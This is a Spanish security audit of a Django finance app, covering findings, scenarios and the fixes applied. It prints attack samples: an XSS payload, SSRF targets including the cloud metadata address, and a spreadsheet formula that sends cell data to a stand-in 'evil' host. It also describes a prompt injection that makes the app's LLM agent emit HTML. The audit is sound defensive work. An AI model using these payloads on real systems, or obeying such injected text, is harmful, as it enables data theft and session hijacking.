# Auditoría de ciberseguridad de GastuApp

- **Fecha:** 2026-11-10
- **Rama:** `feat/captura-bancaria`
- **Alcance:** toda la app, excepto el diseño interno de las tools del agente IA, que se revisa en la Fase 2.
- **Planes previos:** `PLAN_HARDENING.md` y `PLAN_IA.md`. Lo que ya estaba hecho no se repite aquí: SECRET_KEY/DEBUG seguros, cookies `Secure`/`HttpOnly`/`SameSite`, HSTS, el default de DRF `IsAuthenticated`, la validación de `next` en el login, `@login_required` en las vistas huérfanas, SRI en lucide/Swal/driver y el tope de 2 MB del CSV.
- `manage.py check --deploy` con `DEBUG=False`: sin advertencias.

## Lo que está bien

- **IDOR:** no se encontró ninguno. Todas las consultas filtran por `request.user` o por el dueño vía FK en presupuesto, programaciones, ahorros, movimientos, historial, notificaciones, dashboard, captura_bancaria y agente_financiero. Las categorías son globales y solo las modifica el staff.
- **panel_admin:** las 15 vistas llevan `@admin_required`, validado en el servidor, y todas las mutaciones son POST con CSRF.
- **Ingesta de captura (`csrf_exempt`):** se autentica con el token compartido `X-Captura-Token`, comparado con `hmac.compare_digest`. En producción, si falta el token, se rechaza todo. El SMTP no hace relay. La confirmación automática exige DKIM válido.
- **WebSocket `/ws/notificaciones/`:** rechaza a los anónimos y cada socket entra solo al grupo `notificaciones_{user.id}`. El cliente no puede elegir grupo.
- **Inyección:** no hay SQL crudo, `eval`, `subprocess` ni `pickle`. El markdown del agente escapa antes de transformar.
- **Secretos:** `.env` nunca se commiteó.

## Hallazgos

### Altos

**A1. XSS almacenado con la descripción de un movimiento (atacante externo)**
- Sinks:
  - `movimientos/static/movimientos/js/movimientos_base.js:334`: `<td>${r.descripcion}</td>`
  - `historial/static/historial/js/historial.js:201`: `${act.descripcion}`
- Origen controlable:
  - El parser de Bancolombia acepta cualquier remitente si el texto menciona "bancolombia" (`captura_bancaria/parsers/bancolombia.py:57-66`).
  - El comercio extraído pasa a `Movimiento.descripcion` al confirmar (`captura_bancaria/services.py:497-503`).
  - También puede venir de la tool `crear_movimiento` del agente, que no pide confirmación (`agente_financiero/herramientas.py:303`).
- **Escenario:** el atacante envía a `alias@gastu.duckdns.org` el correo "Bancolombia: Compraste $1.000 en `<img src=x onerror=...>`". La víctima lo confirma desde pendientes. Al abrir el modal de registros de la categoría o el historial, el script corre con su sesión.
- Sin CSP no hay segunda barrera.

**A2. XSS persistente en el chat del agente**
- **Sink:** `agente_financiero/static/js/agente_financiero.js:283`. `mostradas` y `totalFilas` se concatenan sin escapar.
- **Por qué llega:** si la respuesta del LLM es un JSON `{"bloques":[...]}`, `formatearBot` (`:383-387`) la renderiza como bloques. La respuesta queda guardada y se vuelve a pintar en cada visita (`cargarHistorial`).
- **Escenario:** una prompt injection en la descripción de un movimiento capturado llega al prompt por el recolector y hace que el modelo devuelva un bloque `libreta` con HTML en `mostradas`.

**A3. SSRF y lectura de archivos locales en el PDF del dashboard**
- **Datos:** `dashboard/views.py:197-199` toma `img_tendencia` e `img_pie` del POST tal cual, y la plantilla los pinta como `<img src>` (`dashboard/templates/dashboard/reporte_pdf.html:228,235`).
- **Generación:** `pisa.CreatePDF` se llama sin `link_callback` (`dashboard/export_services.py:159`). xhtml2pdf descarga `http(s)://` y lee `file://` y rutas locales.
- **Escenario:** un usuario recién registrado hace un POST a `/dashboard/exportar/pdf/` con `img_pie=http://redis:6379/` o `http://169.254.169.254/...`. Eso permite escanear la red interna, y cualquier imagen interna queda incrustada en el PDF.

**A4. Un admin puede tomar control del superusuario**
- **Dónde:** `panel_admin/views.py:246-270` (`admin_editar_usuario_ajax`) cambia username, email y contraseña de cualquier usuario, también de otros ADMIN y del superusuario. Las vistas `toggle`, `rol` y `eliminar` sí lo bloquean.
- **Escenario:** un usuario promovido a ADMIN fija una contraseña nueva al superusuario y entra en `/admin/` de Django con todos los permisos.

**A5. Secuestro previo de cuentas con Google**
- **Configuración:** `ACCOUNT_EMAIL_VERIFICATION='none'` (`settings.py:232`) junto con `EMAIL_AUTHENTICATION=True` (`settings.py:253`).
- **Escenario:** el atacante se registra en `/register/` con `victima@gmail.com` y su propia contraseña. Cuando la víctima entra con Google, allauth la mete en esa cuenta, y el atacante sigue viendo todo con su contraseña.

**A6. El rate limit por IP es global detrás de nginx**
- **Dónde:** `usuarios/views.py:22` (registro, 10/h), `usuarios/views.py:51` (login, 5/m) y el chat del agente (`agente_financiero/api_views.py:27`, 30/m). Los tres usan `key='ip'`, que lee `REMOTE_ADDR`.
- **Por qué es global:** daphne corre sin `--proxy-headers`, así que `REMOTE_ADDR` es siempre la IP del contenedor nginx.
- **Escenario:** 5 POST por minuto a `/login/` bloquean el login de todos los usuarios. Además, el login no tiene límite por cuenta.

### Medios

- **M1. Inyección de fórmulas en CSV y Excel.**
  - **Dónde:** `movimientos/views_exportar.py:111,187`, `ahorros/views_exportar.py:61,119` y `dashboard/export_services.py:86`.
  - **Escenario:** una descripción `=HYPERLINK("http://evil/?"&A1,"x")`, que puede llegar por captura, se ejecuta al abrir el archivo.
- **M2. DoS al crear metas de ahorro.**
  - **Dónde:** `cantidad_cuotas` no tiene tope (`ahorros/forms.py:11-18`), y la frecuencia DIARIA admite una fecha meta en el año 9999 (`ahorros/services.py:89-92,130-133`).
  - **Efecto:** millones de iteraciones o inserciones con un solo POST.
- **M3. Correos falsificados contra la captura.**
  - Cualquiera que conozca el alias genera pendientes (con datos sin sanear, ver A1).
  - Cada correo así puede gastar cuota de Groq en el parser IA (`captura_bancaria/parsers/ia.py`).
  - Marca el buzón como `verificado` sin DKIM (`captura_bancaria/services.py:275`).
  - La ingesta es pública vía nginx (`/captura/api/ingesta/`); solo la protege el token.
- **M4. Django 5.2.0 sin parches.** `requirements.txt` fija `Django==5.2`, y la rama 5.2.x ha publicado varias correcciones de seguridad (SQL injection en `FilteredRelation` y `_connector`, DoS). Hay que subir al último parche 5.2.x.
- **M5. Sin Content-Security-Policy.** Lo ideal es una CSP en modo `Report-Only` primero. Además, `dashboard/templates/dashboard/home.html:12` carga ApexCharts desde jsdelivr sin versión ni SRI.
- **M6. Enumeración de cuentas.**
  - El registro dice "Ya existe una cuenta con este correo" (`usuarios/forms.py:66`).
  - El login revela que una cuenta es de Google (`usuarios/forms.py:156-169`).
- **M7. SweetAlert2 interpreta `title` como HTML.**
  - `GastuAlerts.toast*` (`static/js/gastu_alerts.js:51,66,81`) y los mensajes de Django en `base_app.html:779,804` y `base_admin.html:118` usan `title`.
  - Hoy solo es explotable por un admin con un CSV de categorías malicioso, pero es un sink general.
- **M8. Ingesta de captura con `SECURE_SSL_REDIRECT`.** Riesgo funcional más que de seguridad, pendiente de comprobar en producción. Con `CAPTURA_INGESTA_URL=http://127.0.0.1:8000/...` por defecto y `SECURE_SSL_REDIRECT=True`, el POST interno recibe un 301 y se pierde, salvo que el `.env` de producción lo sobrescriba.

### Bajos

- **B1. XSS que solo afecta al propio usuario o que depende de datos del admin.**
  - Nombre de la meta de ahorro en `dashboard/static/dashboard/js/dashboard.js:686,703`, en el tooltip de `dashboard.js:473` y en `{{ pie_json|safe }}` (`home.html:689`, donde un `</script>` rompe el bloque).
  - Nombre de categoría en `static/js/category-picker.js:300-304`.
  - Previsualización del CSV en `panel_admin/templates/panel_admin/importar_categorias.html:230,271-310`.
  - Hay dos sinks latentes: `dashboard.js:1394` y `movimientos/templates/movimientos/detalle_categoria.html:779`.
- **B2. Logout por GET y sin CSRF** (`usuarios/views.py:87`).
- **B3. El WebSocket no usa `AllowedHostsOriginValidator`** (`gastu_django/asgi.py:24`). `SameSite=Lax` lo mitiga.
- **B4. Reautenticación débil.**
  - Un usuario de Google borra su cuenta sin reautenticarse (`usuarios/views.py:126`).
  - El admin cambia su propio email sin pedir la contraseña actual (`panel_admin/views.py:146-163`).
  - Perfil y exportaciones no tienen ratelimit.
  - `/auth/signup/` de allauth es una segunda vía de registro que se salta el límite de 10/h.
- **B5. Fugas de `str(e)`** en `panel_admin/views.py:394` y `usuarios/views.py:156`.
- **B6. Fallos del importador CSV.**
  - El fallback a latin-1 lee un stream ya consumido (`panel_admin/services.py:47-49`).
  - No valida la longitud de `nombre`, no limita las filas y no usa transacción.
- **B7. Categorías de sistema, de ahorro o inactivas aceptadas por API.** Pasa en `movimientos/views_api.py:243` y en los serializers de programaciones y presupuestos.
- **B8. Fuga de un agregado global.** `uso_global` cuenta los movimientos de todos los usuarios (`categorias/api_views.py:76`).
- **B9. Redirección por `Referer`** cuando la exportación está vacía (`movimientos/views_exportar.py:93`).
- **B10. Errores 500 por parámetros mal formados.** `int()` sin `try` y `MESES_ES[13]` en `dashboard/views.py:172,190`, y lo mismo en `movimientos/views_api.py:98-104`.
- **B11. Detalles de configuración.**
  - `SOCIALACCOUNT_LOGIN_ON_GET=True`.
  - La contraseña por defecto `Admin123!` en `build.sh` y `.env.example`.
  - El prefijo `/accounts/` del middleware no coincide con `/auth/`.
  - Hay dependencias sin uso (`google-generativeai`, `google-api-python-client`, `playwright`, `groq`) y herramientas de test en `requirements.txt`.
  - El contenedor corre como root (pendiente desde `PLAN_HARDENING.md`).
- **B12. Una `SECRET_KEY` antigua sigue en el historial de git.** Es `django-insecure-sr^8...` (commits `67553a1` a `539b159`). Si producción la usó alguna vez, hay que rotarla. El commit del `.env.example` expone también el ID del proyecto Supabase, sin contraseña.

## Estado tras las correcciones (lotes 1 y 2)

**Corregido:**
- A1: escape en `movimientos_base.js` e `historial.js`. Además, `limpiar_texto_externo` quita `<>{}`, comillas invertidas, barras invertidas y caracteres de control del comercio y del producto capturados.
- A2: `mostradas` y `total_filas` se convierten a entero.
- A3: el PDF solo acepta PNG en data URI, y `link_callback_seguro` bloquea cualquier URL y cualquier archivo fuera de los estáticos, tanto en el PDF del dashboard como en el de movimientos.
- A4: un admin no puede editar cuentas privilegiadas; solo el superusuario puede.
- A6:
  - El rate limit por IP usa `X-Real-IP` cuando la petición llega del proxy.
  - El login tiene además un límite por correo (20/h).
  - El login y el registro cuentan solo los POST.
- M1: `texto_seguro` en las exportaciones CSV y Excel de movimientos, ahorros y dashboard.
- M2: tope de 1000 cuotas y 30 años por meta, y tope dentro del bucle del servicio.
- M3: la IA de captura sin DKIM tiene un cupo de 20 lecturas al día por buzón (`CAPTURA_IA_MAX_SIN_DKIM`).
- M5:
  - Hay una CSP en modo `Report-Only` (`ContentSecurityPolicyMiddleware`, `CSP_POLITICA`).
  - ApexCharts quedó fijado en 8.5.0 con SRI.
  - `lucide@latest` se fijó en `dashboard/base.html`.
- M7: `titleText` en `GastuAlerts`.
- B1:
  - Escape de las metas, del tooltip y de los sinks latentes de `dashboard.js`.
  - `category-picker.js` escapa nombres e iconos.
  - `json_script` en lugar de `pie_json|safe`.
- B2: el logout solo cierra la sesión por POST.
- B3: `AllowedHostsOriginValidator` en el WebSocket.

**Revisado al implementar:**
- A5 ya está mitigado por allauth 65.15. En `_accept_login`, `wipe_password` borra la contraseña de la cuenta local cuyo correo no está verificado, y al cambiar la contraseña cambia el hash de sesión, así que las sesiones del atacante quedan invalidadas. No hace falta código propio mientras no se marquen como verificados los correos del registro local.

- M4: Django actualizado a 5.2.19 (último parche de la rama LTS 5.2, noviembre de 2026).

**Pendiente:** M6, M8, B4 a B12 y pasar la CSP a modo estricto.

## Fuera de esta fase

El agente IA crea movimientos sin confirmación y mete en el prompt texto de terceros (comercios capturados). Se revisa en la Fase 2.
